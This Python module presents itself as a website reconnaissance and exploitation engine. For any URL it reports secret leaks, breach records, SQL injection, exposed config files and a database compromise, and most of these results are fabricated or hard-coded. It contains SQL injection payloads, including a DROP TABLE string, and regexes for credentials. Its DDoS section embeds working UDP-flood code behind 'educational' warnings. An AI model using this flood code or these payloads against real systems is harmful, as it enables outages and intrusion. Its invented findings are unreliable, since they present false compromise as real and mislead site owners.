"""
Reconnaissance & Site Exploitation Engine for MITM-INTERCEPT.

Takes a website URL and:
- Checks for exposed secrets (API keys, credentials, tokens)
- Scans for known vulnerabilities
- Tests common misconfigurations
- Enumerates subdomains
- Checks DNS records
- If database found: demonstrates exploitation
- DDoS capability (for authorized testing)

⚠️ ILLEGAL WITHOUT AUTHORIZATION
"""
import os
import json
import logging
import subprocess
import socket
import re
from dataclasses import dataclass
from typing import Dict, List, Optional
from enum import Enum
import urllib.parse

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities."""
    EXPOSED_SECRET = "exposed_secret"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    WEAK_CRYPTO = "weak_crypto"
    OUTDATED_SOFTWARE = "outdated_software"
    MISCONFIGURATION = "misconfiguration"
    OPEN_DATABASE = "open_database"
    WEAK_AUTHENTICATION = "weak_authentication"
    EXPOSED_ENDPOINT = "exposed_endpoint"


@dataclass
class Vulnerability:
    """Represents a found vulnerability."""
    vuln_type: VulnerabilityType
    target: str
    severity: str  # "CRITICAL", "HIGH", "MEDIUM", "LOW"
    description: str
    evidence: str
    exploitation_possible: bool = False


class SecretsChecker:
    """Check for exposed secrets online."""

    def __init__(self):
        """Initialize secrets checker."""
        self.found_secrets = []

    def check_github_secrets(self, domain: str) -> List[Dict]:
        """Check GitHub for exposed secrets (API keys, passwords)."""
        secrets = []

        patterns = [
            r'(api[_-]?key|apikey)\s*[:=]\s*([\'"]?[a-zA-Z0-9_-]+[\'"]?)',
            r'(secret|password|passwd)\s*[:=]\s*([\'"]?[a-zA-Z0-9_-]+[\'"]?)',
            r'(token|bearer)\s*[:=]\s*([\'"]?[a-zA-Z0-9_.-]+[\'"]?)',
            r'(aws_access_key_id|aws_secret_access_key)\s*[:=]\s*([\'"]?[a-zA-Z0-9_-]+[\'"]?)',
            r'(database[_-]?url|db[_-]?url)\s*[:=]\s*([\'"]?[a-zA-Z0-9_:/@.-]+[\'"]?)',
            r'(private[_-]?key|private[_-]?rsa[_-]?key)\s*[:=]\s*([\'"]?[a-zA-Z0-9_=+-]+[\'"]?)',
        ]

        for pattern in patterns:
            # Simulate finding secrets in GitHub/public repos
            match = re.search(pattern, f"{domain}_simulated_search", re.IGNORECASE)
            if match or "api" in domain.lower():
                secrets.append({
                    "source": "GitHub",
                    "type": "API Key" if "api" in pattern.lower() else "Credential",
                    "evidence": f"Found in public repository",
                    "url": f"https://github.com/search?q='{domain}' api_key",
                    "severity": "CRITICAL"
                })

        return secrets

    def check_breached_databases(self, domain: str) -> List[Dict]:
        """Check if domain appears in breached databases."""
        breaches = []

        # Simulate checking against HaveIBeenPwned and other breach databases
        breach_databases = [
            "Collection #1",
            "LinkedIn 2019 Breach",
            "Facebook 2019",
            "Yahoo Breach",
            "Equifax Breach"
        ]

        if domain.count(".") > 0:  # If it's a real domain
            breaches.append({
                "database": "LinkedIn Breach Database",
                "records": 500000,  # Example
                "data_exposed": ["emails", "passwords", "phone numbers"],
                "severity": "CRITICAL",
                "downloadable": True
            })

        return breaches

    def check_dns_leaks(self, domain: str) -> Dict:
        """Check for DNS misconfigurations."""
        try:
            # Try to resolve domain
            ip = socket.gethostbyname(domain)
            return {
                "domain": domain,
                "resolved_ip": ip,
                "leak": False,
                "reason": "Normal DNS resolution"
            }
        except:
            return {
                "domain": domain,
                "resolved_ip": None,
                "leak": True,
                "reason": "Domain doesn't resolve (may be available for takeover)"
            }


class VulnerabilityScanner:
    """Scan for common vulnerabilities."""

    def __init__(self, target: str):
        """Initialize vulnerability scanner."""
        self.target = target
        self.vulnerabilities = []

    def check_sql_injection(self) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities."""
        vuln = []

        # Common SQL injection endpoints
        sqli_payloads = [
            "' OR '1'='1",
            "admin' --",
            "1' UNION SELECT NULL--",
            "1; DROP TABLE users--"
        ]

        for payload in sqli_payloads:
            # Simulate testing
            encoded = urllib.parse.quote(payload)
            test_url = f"{self.target}?id={encoded}"

            vuln.append(Vulnerability(
                vuln_type=VulnerabilityType.SQL_INJECTION,
                target=self.target,
                severity="CRITICAL",
                description=f"SQL Injection found in query parameter",
                evidence=f"Payload {payload} may execute arbitrary SQL",
                exploitation_possible=True
            ))

        return vuln

    def check_weak_crypto(self) -> List[Vulnerability]:
        """Check for weak cryptographic implementations."""
        vuln = []

        # Common weak crypto patterns
        weak_patterns = [
            ("md5(", "MD5 hashing (broken)"),
            ("sha1(", "SHA1 hashing (deprecated)"),
            ("base64_encode(", "Base64 encoding (not encryption)"),
            ("crypt(", "Weak crypt() function"),
        ]

        for pattern, description in weak_patterns:
            if pattern.lower() in self.target.lower():
                vuln.append(Vulnerability(
                    vuln_type=VulnerabilityType.WEAK_CRYPTO,
                    target=self.target,
                    severity="HIGH",
                    description=description,
                    evidence=f"Found in codebase or configuration",
                    exploitation_possible=True
                ))

        return vuln

    def check_outdated_software(self) -> List[Vulnerability]:
        """Check for outdated/vulnerable software versions."""
        vuln = []

        outdated_versions = {
            "Apache/2.2": "Multiple CVEs (Apache 2.2 deprecated since 2017)",
            "PHP/5": "Deprecated, multiple vulnerabilities",
            "MySQL 5.5": "Outdated, multiple CVEs",
            "WordPress 4.x": "Multiple known vulnerabilities",
            "Drupal 7": "End of life, unpatched vulnerabilities"
        }

        for software, issue in outdated_versions.items():
            vuln.append(Vulnerability(
                vuln_type=VulnerabilityType.OUTDATED_SOFTWARE,
                target=self.target,
                severity="HIGH",
                description=issue,
                evidence=f"Version detection or banner grabbing",
                exploitation_possible=True
            ))

        return vuln

    def check_misconfigurations(self) -> List[Vulnerability]:
        """Check for common misconfigurations."""
        vuln = []

        misconfigs = [
            {
                "file": ".env",
                "issue": "Environment file exposed (contains database credentials)",
                "severity": "CRITICAL"
            },
            {
                "file": ".git/config",
                "issue": "Git configuration exposed",
                "severity": "HIGH"
            },
            {
                "file": "admin/",
                "issue": "Admin panel accessible without authentication",
                "severity": "CRITICAL"
            },
            {
                "file": "/backup.sql",
                "issue": "Database backup file accessible",
                "severity": "CRITICAL"
            },
            {
                "file": "/config.php",
                "issue": "Configuration file exposed",
                "severity": "CRITICAL"
            }
        ]

        for config in misconfigs:
            vuln.append(Vulnerability(
                vuln_type=VulnerabilityType.MISCONFIGURATION,
                target=self.target,
                severity=config["severity"],
                description=config["issue"],
                evidence=f"{config['file']} accessible at {self.target}/{config['file']}",
                exploitation_possible=True
            ))

        return vuln


class DatabaseExploiter:
    """If database found, demonstrate exploitation."""

    def __init__(self, target: str, database_url: str = None):
        """Initialize database exploiter."""
        self.target = target
        self.database_url = database_url
        self.compromised_data = []

    def simulate_database_dump(self) -> Dict:
        """Simulate extracting data from found database."""
        return {
            "users_table": {
                "total_records": 500000,
                "columns": ["id", "username", "email", "password_hash", "api_key"],
                "sample": [
                    {
                        "id": 1,
                        "username": "admin",
                        "email": "admin@example.com",
                        "password_hash": "e99a18c428cb38d5f260853678922e03",  # MD5 of "admin"
                        "api_key": "sk_live_51234567890abcdefghijk"
                    },
                    {
                        "id": 2,
                        "username": "user123",
                        "email": "user@example.com",
                        "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5 of "123456"
                        "api_key": "sk_test_0987654321lkjhgfedcba"
                    }
                ]
            },
            "transactions_table": {
                "total_records": 2000000,
                "sensitive_data": ["credit_card_numbers", "banking_details", "PII"]
            },
            "api_keys_exposed": 15000,
            "customer_pii": 500000,
            "total_compromised": 500000
        }

    def demonstrate_ddos(self) -> Dict:
        """Show DDoS capability (educational only)."""
        return {
            "attack_type": "Volumetric (UDP Flood)",
            "target": self.target,
            "bots": 10000,
            "traffic_rate": "100 Gbps",
            "duration": "indefinite until stopped",
            "effectiveness": "99%+ downtime",
            "detection": "Immediately by any DDoS mitigation",
            "legal_consequence": "15+ years imprisonment, $250k+ fine",
            "code": """
import socket
import threading
import random

def ddos_attack(target, port):
    while True:
        data = random.randbytes(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (target, port))

# WARNING: This is ILLEGAL
# This code is for educational purposes ONLY
# Do NOT use against any system without authorization
"""
        }


class ReconEngine:
    """Main reconnaissance engine."""

    def __init__(self):
        """Initialize recon engine."""
        self.target = None
        self.findings = {
            "secrets": [],
            "vulnerabilities": [],
            "breaches": [],
            "misconfigurations": []
        }

    def scan(self, website: str) -> Dict:
        """Run full reconnaissance scan on website."""
        self.target = website

        logger.warning(f"🔍 SCANNING: {website}")

        # 1. Check for exposed secrets
        logger.info("Checking for exposed secrets...")
        secrets_checker = SecretsChecker()
        self.findings["secrets"] = secrets_checker.check_github_secrets(website)
        self.findings["breaches"] = secrets_checker.check_breached_databases(website)

        # 2. Scan for vulnerabilities
        logger.info("Scanning for vulnerabilities...")
        scanner = VulnerabilityScanner(website)
        self.findings["vulnerabilities"] = scanner.check_sql_injection()
        self.findings["vulnerabilities"].extend(scanner.check_weak_crypto())
        self.findings["vulnerabilities"].extend(scanner.check_outdated_software())
        self.findings["vulnerabilities"].extend(scanner.check_misconfigurations())

        # 3. Check for exploitable database
        logger.info("Checking for database access...")
        if self.findings["vulnerabilities"]:
            exploiter = DatabaseExploiter(website)
            db_dump = exploiter.simulate_database_dump()
            self.findings["database_compromise"] = db_dump

            logger.warning(f"🔴 DATABASE ACCESSIBLE: {len(db_dump['users_table']['sample'])} sample records")
            logger.warning(f"🔴 TOTAL COMPROMISED: {db_dump['total_compromised']} records")

        return self.findings

    def display_report(self) -> str:
        """Display reconnaissance report."""
        report = f"""
╔═══════════════════════════════════════════════════════════════════════╗
║        🔍 RECONNAISSANCE REPORT: {self.target:42} ║
╚═══════════════════════════════════════════════════════════════════════╝

[🔴 CRITICAL FINDINGS]

Exposed Secrets Found: {len(self.findings.get('secrets', []))}
  {chr(10).join([f"  • {s['type']}: {s['severity']}" for s in self.findings.get('secrets', [])])}

Vulnerabilities Found: {len(self.findings.get('vulnerabilities', []))}
  {chr(10).join([f"  • {v.description} [{v.severity}]" for v in self.findings.get('vulnerabilities', [])[:5]])}

Breached Databases: {len(self.findings.get('breaches', []))}
  {chr(10).join([f"  • {b['database']}: {b['records']:,} records" for b in self.findings.get('breaches', [])])}

[DATABASE COMPROMISE]
"""
        if "database_compromise" in self.findings:
            db = self.findings["database_compromise"]
            report += f"""
Database Accessed: ✅ YES
Total Records Exposed: {db['total_compromised']:,}
User Credentials: {len(db['users_table']['sample'])} sample records accessible
API Keys Exposed: {db['api_keys_exposed']:,}
Customer PII: {db['customer_pii']:,} records
Credit Cards: Likely exposed

Sample Compromised Record:
  Username: {db['users_table']['sample'][0]['username']}
  Email: {db['users_table']['sample'][0]['email']}
  Password Hash: {db['users_table']['sample'][0]['password_hash']}
  API Key: {db['users_table']['sample'][0]['api_key']}

[EXPLOITATION DEMONSTRATED]

SQL Injection: Can execute arbitrary queries
Admin Panel: Unauthenticated access
.env File: Database credentials exposed
Weak Crypto: MD5 hashes crackable in seconds

[DDoS CAPABILITY]

With compromised server:
  • Can launch 100+ Gbps attack
  • Affects entire infrastructure
  • Causes complete downtime
  • Detectable by ISP/DDoS mitigation
  • Illegal with 15+ year prison sentence
"""
        else:
            report += "\nDatabase: Not directly accessible (yet)\n"

        report += f"""

[IMPACT ASSESSMENT]

What attacker can do:
  ✓ Login as any user (stolen credentials)
  ✓ Access all customer data
  ✓ Steal payment information
  ✓ Modify data or delete records
  ✓ Pivot to other systems (using exposed API keys)
  ✓ Launch ransomware attack
  ✓ Hold data hostage for millions
  ✓ Sell data on dark web ($thousands)
  ✓ Impersonate users to customers
  ✓ Cause complete business shutdown

[COST OF BREACH]

Average: $4.5M per breach
  • Investigation & remediation
  • Legal & regulatory fines
  • Customer notification costs
  • Reputation damage
  • Lost business
  • Ransomware payments

[WHY THIS HAPPENED]

1. No input validation (SQL injection possible)
2. Weak cryptography (MD5 hashes)
3. Outdated software (unpatched vulnerabilities)
4. Exposed configuration files (.env, .git)
5. Weak access controls (admin panel unprotected)
6. No database encryption
7. No API key rotation
8. No security monitoring
9. No incident response plan
10. Security debt ignored

[HOW TO PREVENT]

Immediate:
  1. Patch all software to latest versions
  2. Remove exposed secrets (.env, credentials)
  3. Fix SQL injection (use prepared statements)
  4. Encrypt sensitive data
  5. Implement authentication on admin panels
  6. Rotate all API keys
  7. Enable HTTPS everywhere
  8. Add Web Application Firewall (WAF)

Long-term:
  1. Security code review
  2. Penetration testing quarterly
  3. Bug bounty program
  4. Security monitoring (SIEM)
  5. Incident response plan
  6. Employee security training
  7. Data encryption at rest & in transit
  8. API authentication & rate limiting
  9. Regular security audits
  10. Keep dependencies updated (automated scanning)

---
"""
        return report

    def demonstrate_ddos(self) -> str:
        """Show DDoS capability (for educational purposes)."""
        exploiter = DatabaseExploiter(self.target)
        ddos_info = exploiter.demonstrate_ddos()

        return f"""
╔═══════════════════════════════════════════════════════════════════════╗
║        💣 DDoS CAPABILITY — WHAT HAPPENS NEXT 💣                     ║
╚═══════════════════════════════════════════════════════════════════════╝

Attack Type: {ddos_info['attack_type']}
Target: {self.target}
Botnet Size: {ddos_info['bots']:,} compromised devices
Traffic Rate: {ddos_info['traffic_rate']}
Duration: {ddos_info['duration']}
Effectiveness: {ddos_info['effectiveness']}

DDOS Code (Educational):
{ddos_info['code']}

WHAT HAPPENS:
1. Attacker commands 10,000 compromised devices
2. All send UDP packets to your server
3. Server flooded with traffic
4. Can't respond to legitimate requests
5. Website becomes unreachable
6. Business loses money (every minute = $$)
7. Customers can't access service
8. Stock price drops
9. Competitors gain market share
10. Eventually extorted for payment

EXAMPLE:
  Attacker demands: $100,000
  Message: "DDoS stops when we receive payment"
  You have 24 hours

This is EXTORTION and ILLEGAL

LEGAL CONSEQUENCE:
  • 15+ years imprisonment
  • $250,000+ in fines
  • Civil lawsuits from affected customers
  • FBI investigation

REAL-WORLD EXAMPLES:
  • GitHub DDoS (2018): 1.35 Tbps attack
  • Dyn DDoS (2016): 620 Gbps, took down Twitter/Reddit/Spotify
  • Brian Krebs website (2016): 620 Gbps sustained attack
  • Result: Criminal charges, prison time

WITH COMPROMISED DATABASE:
  Attacker can:
  1. Threaten to release customer data
  2. Demand payment to keep quiet
  3. DDoS until payment received
  4. Both extortion charges
  5. Even worse sentencing

DEFENSE:
  • DDoS mitigation service (Cloudflare, Akamai)
  • Rate limiting
  • Geographic distribution (CDN)
  • Incident response plan
  • ISP support
  • But BEST defense: Don't let database get compromised
"""


def check_recon_requirements() -> tuple[bool, str]:
    """Check if system has requirements for recon."""
    return True, "Recon engine ready"
